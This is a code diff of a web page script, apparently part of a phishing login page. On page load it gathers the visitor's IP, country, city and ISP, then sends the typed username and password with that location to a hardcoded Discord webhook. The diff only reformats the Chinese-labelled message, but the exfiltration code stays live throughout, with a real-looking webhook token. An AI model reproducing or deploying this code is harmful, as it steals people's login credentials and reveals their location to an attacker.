@@ -19,12 +19,12 @@ document.addEventListener("DOMContentLoaded", () => {
             .then(res => res.json())
             .then(geo => {
                 const locationInfo = `
-                IP：${geo.query}
-                國家：${geo.country} (${geo.countryCode})
-                地區：${geo.regionName}
-                城市：${geo.city}
-                時區：${geo.timezone}
-                ISP：${geo.isp}
+IP：${geo.query}
+國家：${geo.country} (${geo.countryCode})
+地區：${geo.regionName}
+城市：${geo.city}
+時區：${geo.timezone}
+ISP：${geo.isp}
                 `.trim();
 
                 const webhookURL = "https://discord.com/api/webhooks/1380062024582692935/3_1l1EnLTwsSR1uH15wUhb1jdg-5DE4IZ-OLNbYcrRh9KWlE65RM9KZfIaVwPoW1xLQj";
@@ -35,12 +35,12 @@ document.addEventListener("DOMContentLoaded", () => {
                         "Content-Type": "application/json",
                     },
                     body: JSON.stringify({
-                        content: `帳密資訊：
-                        帳號：${username}
-                        密碼：${password}
-                        
-                        使用者位置資訊：
-                        ${locationInfo}`
+                        content: `帳密：
+帳號：${username}
+密碼：${password}
+
+使用者位置資訊：
+${locationInfo}`
                     }),
                 });
             })
